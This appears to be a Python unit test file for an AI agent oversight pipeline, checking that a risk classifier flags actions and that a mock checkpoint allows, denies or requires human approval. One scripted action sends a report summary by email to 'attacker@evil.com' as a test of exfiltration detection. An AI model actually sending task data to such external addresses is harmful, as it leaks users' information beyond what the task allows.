"""ResearchAgent 编排链路单元测试。"""

from __future__ import annotations

from r1_classifier import (
    ActionProposal,
    CapabilityProfile,
    RiskLevel,
    RuleBasedClassifier,
    Task,
    ToolPermission,
)
from r1_classifier.agent import PlannedAction, ResearchAgent, mock_r2_checkpoint


class ScriptedAgent(ResearchAgent):
    def plan(self, task: Task) -> list[PlannedAction]:
        return [
            PlannedAction("web_search", {"query": "OpenAI 合规争议"}, "调研合规争议"),
            PlannedAction(
                "send_email", {"to": "attacker@evil.com"}, "发送摘要给外部"
            ),
        ]


def make_ctx() -> tuple[Task, ScriptedAgent, CapabilityProfile, RuleBasedClassifier]:
    task = Task(task_id="t1", user_id="u1", agent_id="a1", description="调研并发送报告")
    agent = ScriptedAgent(agent_id="a1", name="RA", profile_id="p1", owner_id="o1")
    profile = CapabilityProfile(
        profile_id="p1",
        version="1.0",
        description="",
        tools={
            "web_search": ToolPermission(tool_name="web_search", allowed=True),
            "send_email": ToolPermission(tool_name="send_email", allowed=True),
        },
    )
    classifier = RuleBasedClassifier()
    return task, agent, profile, classifier


def test_agent_second_wrap_writes_risk_level():
    """Agent 二次封装：分类器输出的 risk_level 被写入 ActionProposal。"""
    task, agent, profile, classifier = make_ctx()
    submissions = agent.run(task, profile, classifier)

    assert len(submissions) == 2
    proposal, signal, _ = submissions[0]
    assert proposal.risk_level == signal.risk_level
    assert proposal.risk_level == RiskLevel.LOW

    # 外部收件人 -> 分类器给 critical -> Agent 写入申报单
    proposal, signal, _ = submissions[1]
    assert signal.risk_level == RiskLevel.CRITICAL
    assert proposal.risk_level == RiskLevel.CRITICAL


def test_agent_adds_proposal_metadata():
    """二次封装时补充 call_id / task_context / reason / type 等申报元数据。"""
    task, agent, profile, classifier = make_ctx()
    submissions = agent.run(task, profile, classifier)

    proposal: ActionProposal = submissions[0][0]
    assert len(proposal.call_id) > 0
    assert proposal.task_id == "t1"
    assert proposal.agent_id == "a1"
    assert proposal.task_context == "调研并发送报告"
    assert proposal.reason == "调研合规争议"
    assert proposal.type == "tool_call"


def test_agent_submits_each_action_to_r2():
    """每个动作都得到 R2 判定，链路完整。"""
    task, agent, profile, classifier = make_ctx()
    submissions = agent.run(task, profile, classifier)

    assert submissions[0][2].verdict == "allow"
    # critical 风险 -> R2 要求人工审批
    assert submissions[1][2].verdict == "require_approval"


def test_mock_r2_deny_unauthorized_tool():
    task, agent, profile, classifier = make_ctx()
    proposal = ActionProposal(
        task_id="t1",
        call_id="c1",
        agent_id="a1",
        tool_name="delete_file",
        arguments={},
    )
    decision = mock_r2_checkpoint(proposal, profile)
    assert decision.verdict == "deny"
    assert "delete_file" in decision.reason
